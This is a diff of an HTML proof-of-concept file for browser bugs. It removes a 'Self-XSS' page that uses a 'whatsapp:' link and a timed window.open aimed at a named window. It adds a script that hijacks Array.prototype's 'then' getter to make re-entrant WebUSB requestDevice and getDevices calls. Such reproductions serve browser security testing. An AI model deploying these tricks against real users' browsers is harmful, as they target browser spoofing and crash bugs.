@@ -1,24 +1,18 @@
-<!DOCTYPE HTML>
-<html lang="en-US">
-	<head>
-		<meta charset="UTF-8">
-		<meta name="viewport" content="width=device-width, user-scalable=no">
-		<title>Self-XSS</title>	   
-		<script>
-			const redirect = () => {
-				setTimeout(() => {
-					open("https://google.com", "win");
-				}, 500);
-			}
-		</script>
-	</head>
-
-	<body>
-	   <center>
-			<br>
-			<h1><a  href="whatsapp:11111" target="win" onclick="redirect();">Click here to go to https://google.com</a></h1>
-		</center>
-	</body>
-</html>
+<body>
+<h1>Click anywhere</h1>
+<script>
 
 
+  in_then_getter = false;
+  Array.prototype.__defineGetter__('then', function () {
+    if (in_then_getter)
+      return;
+    navigator.usb.requestDevice({filters: [{}]});
+    in_then_getter = true;
+    navigator.usb.getDevices();
+    in_then_getter = false;
+  });
+  navigator.usb.getDevices();
+
+</script>
+</body>
